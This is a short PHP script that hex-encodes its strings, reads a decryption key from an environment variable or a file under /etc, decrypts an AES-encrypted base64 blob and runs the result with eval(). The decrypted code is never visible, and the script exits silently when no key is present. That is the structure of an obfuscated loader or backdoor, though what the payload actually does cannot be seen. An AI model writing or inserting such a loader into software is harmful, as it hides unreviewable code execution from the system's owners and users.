<?php
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('5OiPrwhSzxa4RCBHBmF2hg==');

$c=base64_decode(

'jysFWBuD6yqsIHUT6NBBn1PPdaQhnMCKae/+e+PoqCFDxkQLB9H8DDMIXup/GBGb8mNM+gg8AFcF' .
'4yNS0Kn0iLTl5S8/uvRwweo4kO2cFXjcfHo5FlpmPt6E7SbelC0Vrmy95gzCBd5My1MEcYS940jC' .
'Y4/PpstSj2553yZu9Edbs6M2HitOsa9AQI4Q/VcOeNAp7zxGHKRYvxDtxv73ksrh1Uaq23SWA29A' .
'7XfyxfygeqcpkWfg1enu4iwU8d3TiW2k2fWIWiOpxfpwnQftk4ZHtenvmDCQv81l0d1TZT95Gy0f' .
'dfYOjmjTcbuIhBgfGRESupw2h2f50fSrabltmts7C4BXaUVcI1Q4/sTa3W6TdQgher/fXg3MCvoR' .
'ztquvJfarXV5HslxAi+0rewGOURzGCYXOtTvqDMCqQgWPgITTH+edP0wD3En975toIKlW9+KpO8c' .
'1UqdZkOBXN5t7uBDlQWYCtDj6Y0qxU21seP5arYEbrMkcDCP6u163YvPBMnV+vueXk85c+VbXGp2' .
'eKbZME3f1qnyum6w2sZ1LW4='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

